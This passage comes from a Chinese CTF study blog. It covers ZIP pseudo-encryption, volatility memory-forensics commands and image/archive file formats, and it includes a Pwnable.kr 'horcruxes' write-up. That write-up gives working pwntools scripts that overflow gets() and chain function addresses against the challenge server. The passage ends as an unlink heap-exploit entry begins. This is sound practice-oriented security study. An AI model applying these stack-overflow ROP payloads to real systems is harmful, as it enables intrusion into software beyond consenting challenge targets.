00 00</td><td align="center">目录区对第一张磁盘的偏移量</td></tr><tr><td align="center">00 00</td><td align="center">ZIP文件注释长度</td></tr></tbody></table><h2 id="伪加密原理"><a href="#伪加密原理" class="headerlink" title="伪加密原理"></a>伪加密原理</h2><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。</p><h3 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>00 00</code></p><h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p>压缩源文件数据区的全局加密应当为<code>00 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h3 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h3><p>压缩源文件数据区的全局加密应当为<code>09 00</code><br>且压缩源文件目录区的全局方式位标记应当为<code>09 00</code></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>新建一个文件，压缩为一个无密码的后缀名为zip的包。</p><p><img src="https://i.loli.net/2019/10/15/5NObJMkrma3PpIV.png"></p><p>用winhex打开找到<strong>压缩源文件目录区</strong>，找到全局方式位修改为<code>09 00</code>。尝试解压文件会提示输入秘密。</p><p> <img src="https://i.loli.net/2019/10/15/TpdSQ5XtU1hDy6L.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://blog.csdn.net/ETF6996/article/details/51946250">zip伪加密</a></p></li><li><p><a href="https://blog.csdn.net/kajweb/article/details/76474476">[CTF]zip伪加密</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪加密 </tag>
            
            <tag> ZIP压缩包 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存取证-volatility</title>
      <link href="archives/ef33b88f/"/>
      <url>archives/ef33b88f/</url>
      
        <content type="html"><![CDATA[<h1 id="内存取证-volatility"><a href="#内存取证-volatility" class="headerlink" title="内存取证-volatility"></a>内存取证-volatility</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>实测kali 7.x自带，而最新的kali 9.x没有</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>判断镜像信息，获取操作系统类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ?.img&#x2F;raw&#x2F;... imageinfo</span><br></pre></td></tr></table></figure><p>知道操作系统类型后，用<code>--profile</code>指定系统的操作类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f ?.img --profile&#x3D;...</span><br></pre></td></tr></table></figure><p>查看当前显示的notepad文本（提取某个程序）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile&#x3D;WinXPSP2x86 notepad</span><br></pre></td></tr></table></figure><p>查看当前运行的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile&#x3D;WinXPSP2x86 psscan&#x2F;pslist</span><br></pre></td></tr></table></figure><p>扫描所有的文件列表(常常结合grep，即正则)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile&#x3D;WinXPSP2x86 filescan</span><br></pre></td></tr></table></figure><p>根据offset提取出文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f file.raw --profile&#x3D;WinXPSP2x86 dumpfiles -D . -Q 0x.....</span><br></pre></td></tr></table></figure><p>扫描 Windows 的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile&#x3D;WinXPSP2x86 svcscan</span><br></pre></td></tr></table></figure><p>查看网络连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile&#x3D;WinXPSP2x86 connscan</span><br></pre></td></tr></table></figure><p>查看命令行上的操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f file.raw --profile&#x3D;WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure><p>根据pid dump出相应的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f easy_dump.img --profile&#x3D;Win7SP1x64 memdump -p 2580 -D 目录</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://coomrade.github.io/2018/10/27/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E4%B9%8B%E6%97%85/">内存取证之旅</a></p><p><a href="http://shaobaobaoer.cn/archives/693/memory-forensics-tool-volatility-usage-and-practice">内存取证工具volatility用法与实战</a>（ps:这个含手动安装）</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 文件结构 </tag>
            
            <tag> volatility </tag>
            
            <tag> 内存取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件结构</title>
      <link href="archives/2d3e394e/"/>
      <url>archives/2d3e394e/</url>
      
        <content type="html"><![CDATA[<h1 id="图片的结构"><a href="#图片的结构" class="headerlink" title="图片的结构"></a>图片的结构</h1><h2 id="Gif"><a href="#Gif" class="headerlink" title="Gif"></a>Gif</h2><p>一个GIF文件的结构可分为文件头(File Header)、GIF数据流(GIF Data Stream)和文件终结器(Trailer)三个部分。</p><p><img src="https://i.loli.net/2019/10/18/ku6YQBKoUZEO4Am.png"></p><h3 id="文件头部分"><a href="#文件头部分" class="headerlink" title="文件头部分"></a>文件头部分</h3><h4 id="GIF署名-Signature-和版本号-Version"><a href="#GIF署名-Signature-和版本号-Version" class="headerlink" title="GIF署名(Signature)和版本号(Version)"></a>GIF署名(Signature)和版本号(Version)</h4><p>GIF署名用来确认一个文件是否是GIF格式的文件，这一部分由三个字符组成：”GIF”;文件版本号也是由三个字节组成,可以为”87a”或”89a”.具体描述见下表:</p><p><img src="https://i.loli.net/2019/10/18/UWynx68w9GF5Da3.png"></p><p>对应到实际文件中：</p><p><img src="https://i.loli.net/2019/10/18/iGCJLm28AMYRqlT.png"></p><h3 id="GIF数据流部分-GIF-Data-Stream"><a href="#GIF数据流部分-GIF-Data-Stream" class="headerlink" title="GIF数据流部分(GIF Data Stream)"></a>GIF数据流部分(GIF Data Stream)</h3><blockquote><p>这部分不是按照顺序记录，详细顺序参照上面的Gif总结构表</p></blockquote><h4 id="图象标识符-Image-Descriptor"><a href="#图象标识符-Image-Descriptor" class="headerlink" title="图象标识符(Image Descriptor)"></a>图象标识符(Image Descriptor)</h4><p>一个GIF文件内可以包含多幅图象，一幅图象结束之后紧接着下是一幅图象的标识符，图象标识符以0x2C(‘,’)字符开始，定义紧接着它的图象的性质，包括图象相对于逻辑屏幕边界的偏移量、图象大小以及有无局部颜色列表和颜色列表大小，由10个字节组成：</p><p><img src="https://i.loli.net/2019/10/18/JbsgufniGTqUhPr.png"></p><h4 id="注释扩展-Comment-Extension"><a href="#注释扩展-Comment-Extension" class="headerlink" title="注释扩展(Comment Extension)"></a>注释扩展(Comment Extension)</h4><p>这一部分是可选的（需要89a版本），可以用来记录图形、版权、描述等任何的非图形和控制的纯文本数据(7-bit ASCII字符)，注释扩展并不影响对图象数据流的处理，解码器完全可以忽略它。存放位置可以是数据流的任何地方，最好不要妨碍控制和数据块，推荐放在数据流的开始或结尾。具体组成：</p><p><img src="https://i.loli.net/2019/10/18/U2PsuDjkFRf4hLo.png"></p><h3 id="文件结尾部分"><a href="#文件结尾部分" class="headerlink" title="文件结尾部分"></a>文件结尾部分</h3><h4 id="文件终结器-Trailer"><a href="#文件终结器-Trailer" class="headerlink" title="文件终结器(Trailer)"></a>文件终结器(Trailer)</h4><p>这一部分只有一个值为0的字节，标识一个GIF文件结束.</p><p><img src="https://i.loli.net/2019/10/18/jX14qWyA9fb5had.png"></p><p>对应到实际中：</p><p><img src="https://i.loli.net/2019/10/18/iVbd3kKon98lXst.png"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li>[Gif文档](<a href="https://dev.gameres.com/Program/Visual/Other">https://dev.gameres.com/Program/Visual/Other</a> /GIFDoc.htm)</li></ul><h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>JPG/JPEG内部存储是块状类型（即文件内部分为若干块），这些块由ff开头，ff后紧跟的一个标记符指明了这个块的类型。</p><p>JPEG (jpg) 文件头：FFD8FF文件尾：FF D9</p><p>这些分块按出现顺序分别是：</p><p><img src="https://i.loli.net/2019/10/18/AUj2Ynf67eTxt1K.png"></p><h3 id="文件开始-amp-结束"><a href="#文件开始-amp-结束" class="headerlink" title="文件开始&amp;结束"></a>文件开始&amp;结束</h3><p><img src="https://i.loli.net/2019/10/18/LH1hAqaKdVjku2l.png"></p><h3 id="FFE0-APP0-图像识别信息"><a href="#FFE0-APP0-图像识别信息" class="headerlink" title="FFE0 APP0 图像识别信息"></a>FFE0 APP0 图像识别信息</h3><p><img src="https://i.loli.net/2019/10/18/jWft1e5MuJNKBwh.png"></p><ul><li>FFE0：定义交换格式和图像识别信息</li><li>4a46 4946 00：JFIF格式标识符</li><li>01 01：版本号（第一个01是主版本好，第二个01是次版本号）</li><li>01：单位（00=无单位；01=点数/英寸；02=点数/厘米）</li><li>0078：为水平分辨率</li><li>0078：为竖直分辨率</li><li>00：水平点数</li><li>00：竖直点数</li></ul><h3 id="TIPs"><a href="#TIPs" class="headerlink" title="TIPs"></a>TIPs</h3><ul><li>jpg文件缺少文件尾在windows下也能被正确打开。（bugku中的这是一张单纯的图片）</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://blog.csdn.net/blues1021/article/details/45422557">JPG文件格式初步认识</a></li><li><a href="https://blog.csdn.net/sinat_26472165/article/details/85342766">JPEG文件二进制格式分析</a></li></ul><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>PNG文件结构很简单，主要有数据块(Chunk Block)组成，最少包含4个数据块。</p><p><img src="https://i.loli.net/2019/10/18/1o7rIWiunaCMzJO.png"></p><h3 id="PNG图像标识符"><a href="#PNG图像标识符" class="headerlink" title="PNG图像标识符"></a>PNG图像标识符</h3><p>根据PNG文件的定义来说，其文件头位置总是由位固定的字节来描述的：</p><p><img src="https://i.loli.net/2019/10/18/KqGYNAgUdTaIRj3.png"></p><h3 id="IHDR数据块"><a href="#IHDR数据块" class="headerlink" title="IHDR数据块"></a>IHDR数据块</h3><p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节组成，它的格式如下表所示：</p><p><img src="https://i.loli.net/2019/10/19/VXgWyMTHaLqzc5S.png"></p><p><img src="https://i.loli.net/2019/10/19/xgKY8Q3NC4ZlWa1.png"></p><ul><li>00 00 00 0D：IHDR头块长为13</li><li>49 48 44 52：IHDR标识</li><li>00 00 13 40：图像的宽</li><li>00 00 0C C0：图像的高</li><li>44 6D AD B8：CRC校验</li></ul><h3 id="IEND图像结束数据"><a href="#IEND图像结束数据" class="headerlink" title="IEND图像结束数据"></a>IEND图像结束数据</h3><p>它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p><img src="https://i.loli.net/2019/10/19/mcpf8ue2hl7DKYg.png"></p><p>由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p><h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>rar 无加密状态下，压缩包里面每个文件前都有文件头表示 0x74</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200314190010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200314190033.png"></p><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://my.oschina.net/ososchina/blog/801358">PNG图片文件结构分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 文件结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr horcruxes</title>
      <link href="archives/550dc1c0/"/>
      <url>archives/550dc1c0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题考的是ROP系统攻击。百度百科是这样介绍的：</p><blockquote><p><strong>简介</strong>：ROP全称为Return-oriented Programming（面向返回的编程）。是一种基于代码复用的攻击技术，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。</p><p><strong>内在特征</strong>：1. ROP控制流中，call和ret指令不操纵函数，而是用于将函数里面的短指令序列的执行流串起来，但在正常的程序中，call和ret分别代表函数的开始和结束；2. ROP控制流中，jmp指令在不同的库函数甚至不同的库之间跳转，攻击者抽取的指令序列可能取自任意一个二进制文件的任意一个位置，这很不同于正常程序的执行。比如，函数中部提取出的jmp短指令序列，可将控制流转向其他函数的内部；而正常程序执行的时候，jmp指令通常在同一函数内部跳转。</p><p><strong>防范措施</strong>：ROP攻击的程序主要使用栈溢出的漏洞，实现程序控制流的劫持。因此栈溢出漏洞的防护是阻挡ROP攻击最根源性的方法。如果解决了栈溢出问题，ROP攻击将会在很大程度上受到抑制。</p></blockquote><p>总结ROP就是主要利用栈溢出，操纵call、ret、jmp指令，实现程序控制流的劫持，跳转到任意一个位置。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>ssh <a href="mailto:&#x68;&#111;&#114;&#x63;&#x72;&#117;&#120;&#x65;&#x73;&#64;&#x70;&#x77;&#x6e;&#x61;&#98;&#x6c;&#x65;&#x2e;&#107;&#x72;">&#x68;&#111;&#114;&#x63;&#x72;&#117;&#120;&#x65;&#x73;&#64;&#x70;&#x77;&#x6e;&#x61;&#98;&#x6c;&#x65;&#x2e;&#107;&#x72;</a> -p2222 (pw:guest)</strong></p><p>题目只给了程序，没有给源码，那就放ida或gdb查看。程序保护只有NX（不能在栈上运行）</p><p><img src="https://i.loli.net/2019/10/03/K3ujbGtC8qQdAa4.png"></p><p>readme里面主要是告诉我们，编译好的程序运行在机子的9032端口，运行用户是horcruxes-pwn。</p><p>本地运行需要安装32位libseccomp库：<code>apt-get install libseccomp-dev:i386</code></p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><blockquote><p>图中ida截图部分函数名被替换及注释</p></blockquote><p>main函数里面有大量的seccomp函数，查了一下是linux的沙箱之类的，这里看不懂是什么操作就先略过。welcome_borad里面是输出提示语段；</p><p><img src="https://i.loli.net/2019/10/03/x9CGUg53p7ANqD1.png"></p><p>重点来看看init_ABCDEFG()！首先从/dev/urandom里面读取4byte到buf。然后利用buf作为种子生成7个随机数，根据公式运算得到ABCDEFG的值。其中sum为7个数字之和。</p><p><img src="https://i.loli.net/2019/10/03/tvHGlOeb53P7JCB.png"></p><p>初始化7个数后，main函数调用函数<code>ropme()</code>。函数伪C如下。</p><p>第一次（第8 9行）我们输入值与生成的7个数对比，如果相同则调用对应的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">int ropme()</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; &#x2F;&#x2F; [esp+4h] [ebp-74h]</span><br><span class="line">  int v2; &#x2F;&#x2F; [esp+68h] [ebp-10h]</span><br><span class="line">  int fd; &#x2F;&#x2F; [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Select Menu:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v2 &#x3D;&#x3D; a )</span><br><span class="line">  &#123;</span><br><span class="line">    A();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; b )</span><br><span class="line">  &#123;</span><br><span class="line">    B();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; c )</span><br><span class="line">  &#123;</span><br><span class="line">    C();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; d )</span><br><span class="line">  &#123;</span><br><span class="line">    D();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; e )</span><br><span class="line">  &#123;</span><br><span class="line">    E();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; f )</span><br><span class="line">  &#123;</span><br><span class="line">    F();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; g )</span><br><span class="line">  &#123;</span><br><span class="line">    G();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;How many EXP did you earned? : &quot;);</span><br><span class="line">    gets(s);</span><br><span class="line">    if ( atoi(s) &#x3D;&#x3D; sum )</span><br><span class="line">    &#123;</span><br><span class="line">      fd &#x3D; open(&quot;flag&quot;, 0);</span><br><span class="line">      s[read(fd, s, 0x64u)] &#x3D; 0;</span><br><span class="line">      puts(s);</span><br><span class="line">      close(fd);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;You&amp;#039;d better get more experience to kill Voldemort&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们审查<code>A()</code>函数，其余6个数大同小异。</p><p><img src="https://i.loli.net/2019/10/03/i7Tj2ZqEocaIzXv.png"></p><p>当调用<code>A()</code>时，函数返回一段字符串，其中包含<code>a</code>的初始值。</p><p>我们在反观<code>ropme()</code>函数，我们第二次（第41行）的值，与sum对比（7个数之和），如果相同则打印出flag。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在<code>ropme()</code>下的第41行<code>gets()</code>可以造成栈溢出，结合题目提示：这是一题rop攻击的例题。</p><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>利用<code>gets()</code>造成栈溢出覆盖<code>ropme()</code>返回地址，将地址覆盖为函数中的<strong>第44行</strong>，也就是flag。</p><p>程序只开启了NX，我们也不是利用shellcode，看上去是可行的。但是实测，无法返回到<code>ropme()</code>的任何一行。查看溢出覆盖后<code>ropme()</code>的返回地址为非预期地址。谷歌一圈发现是：</p><p><strong><code>0xa</code>会被<code>gets</code>当作输入结束的信号(回车)，并且把<code>0xa</code>替换成<code>0x00</code>(\0)，最终导致没办法直接返回到<code>ropme()</code>函数中去。</strong></p><p><img src="https://i.imgur.com/bHiAxwe.png" alt="img"></p><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>就是把生成的7个值都找出来求和一下就可以了。这里我一开始就踩了坑，看到<code>init_ABCDEFG()</code>在生成随机时，种子是从<code>/dev/urandom</code>中读取的，然后就天真认为每次生成的7个值都是一样的，实际上人家不是伪随机数QAQ。我们利用这个脚本，再次验证一样（虽然事实如此）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039;*120 + p32(0x809fe4b)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">p = remote(&amp;<span class="comment">#039;pwnable.kr&amp;#039;,9032)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;Select Menu:&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;<span class="comment">#039;1&amp;#039;)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;earned? : &amp;#039;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;(EXP +&amp;#039;)</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>也就是说我们需要一次性得到7个随机数。我们看下<code>A()</code>汇编代码：</p><p><img src="https://i.loli.net/2019/10/04/qHD8UC5AkJL1yuR.png"></p><p><code>A()</code>汇编中的<code>retn</code>相当于<code>pop eip、pop cs</code>，即<code>pop eip</code>之后，执行<code>eip</code>指向的指令。</p><p>我们是通过覆盖了<code>ropme()</code>的返回地址为<code>A()</code>。也就是说<code>A()</code>的返回地址则是<code>ropme()</code>返回地址+4。我们用一个图描述一下：</p><p><img src="https://i.loli.net/2019/10/04/yK8AufbzHLX75Tl.png"></p><p>利用这一点，只用我们依次覆写7个函数的地址，就能自动读取到<code>EXP</code>。</p><p>那么现在的问题就变成了，如何返回到<code>ropme()</code>函数。前面我们已经得知了，因为<code>ropme()</code>内存地址特殊，无法跳转，但是<code>ropme()</code>是在<code>main()</code>函数中被调用过的，那么我们可以跳转到<code>main()</code>函数中的这一行。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># 不明原因需要多运行几次直到flag出来</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039;*(0x74+4) # s到eip上距离</span></span><br><span class="line"><span class="comment"># ABCDEFG调用地址</span></span><br><span class="line">payload += p32(<span class="number">0x809FE4B</span>)+p32(<span class="number">0x809FE6A</span>)+p32(<span class="number">0x809FE89</span>)+p32(<span class="number">0x809FEA8</span>)+p32(<span class="number">0x809FEC7</span>)+p32(<span class="number">0x809FEE6</span>)+p32(<span class="number">0x809FF05</span>)</span><br><span class="line"><span class="comment"># ropme调用地址</span></span><br><span class="line">payload += p32(<span class="number">0x0809FFFC</span>)</span><br><span class="line"></span><br><span class="line">p = remote(&amp;<span class="comment">#039;pwnable.kr&amp;#039;,9032)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;Select Menu:&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;<span class="comment">#039;1&amp;#039;)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;earned? : &amp;#039;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">exp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p.recvuntil(&amp;<span class="comment">#039;(EXP +&amp;#039;)</span></span><br><span class="line">    exp += <span class="built_in">int</span>(p.recvline().replace(&amp;<span class="comment">#039;)&amp;#039;,&amp;quot;&amp;quot;).strip())</span></span><br><span class="line"><span class="built_in">print</span> exp</span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;Select Menu:&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;<span class="comment">#039;1&amp;#039;)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;earned? : &amp;#039;)</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(exp))</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>ROP通常利用栈溢出，操纵call、ret、jmp指令，实现程序控制流的劫持，跳转到任意一个位置。</li><li><code>gets()</code>结束输入的标记是<code>0xa(回车)</code>，并将其替换为<code>\0</code>。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://muirelle.com/2018/12/30/Pwnable-kr/">muirelle</a></p><p><a href="https://bbs.pediy.com/thread-249324.htm">pwnable.kr horcruxes ROP利用</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> ROP </tag>
            
            <tag> Pwnable.kr </tag>
            
            <tag> horcruxes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr unlink</title>
      <link href="archives/12117287/"/>
      <url>archives/12117287/</url>
      
        <content type="html"><![CDATA[<h2 id="预习知识"><a href="#预习知识" class="headerlink" title="预习知识"></a>预习知识</h2><h3 id="什么是unlinked"><a href="#什么是unlinked" class="headerlink" title="什么是unlinked"></a>什么是unlinked</h3><p>unlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）</p><h4 id="unlink漏洞条件"><a href="#unlink漏洞条件" class="headerlink" title="unlink漏洞条件"></a>unlink漏洞条件</h4><p>有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出</p><h4 id="unlink的触发"><a href="#unlink的触发" class="headerlink" title="unlink的触发"></a>unlink的触发</h4><p>当使用free函数释放正在使用的chunk时，会相应地检查其相邻的chunk是否空闲。如果空间则将相邻的chunk与free的chunk进行合并。</p><p>unlink有两个安全检测机制，都是针对chunk的header部分。</p><p><img src="https://i.loli.net/2019/09/29/skBJaGIeO2LDSmp.png"></p><blockquote><ul><li>prev_size:记录上一chunk的大小</li><li>size:记录当前chunk的大小</li><li>fd:在链表中指向下一个空闲chunk</li><li>bk:在链表中指向上一个空闲chunk</li></ul></blockquote><p><strong>判断一</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(chunksize (p) !&#x3D; prev_size (next_chunk (p)))</span><br></pre></td></tr></table></figure><p>此判断所代表的含义为检查将从链表中卸下的chunk其size是否被恶意的修改。记录当前size的地方有两处一个是为当前chunk的size字段和下一个chunk(物理地址上相邻的高地址的chunk)的prev_size字段如果这两个字段的值不等，则unlink会抛出异常。</p><p><strong>判断二</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(__builtin_expect (fd-&gt;bk !&#x3D; p || bk-&gt;fd !&#x3D; p, 0))</span><br></pre></td></tr></table></figure><p>这是检查当前chunk的前面一个chunk的bk、后面一个chunk的fd是否指向当前chunk，如果有其中之一不符合，则unlink会抛出异常。</p><h4 id="unlink解链原理"><a href="#unlink解链原理" class="headerlink" title="unlink解链原理"></a>unlink解链原理</h4><p><img src="https://anquan.baidu.com/upload/ue/image/20190222/1550819912485582.jpg" 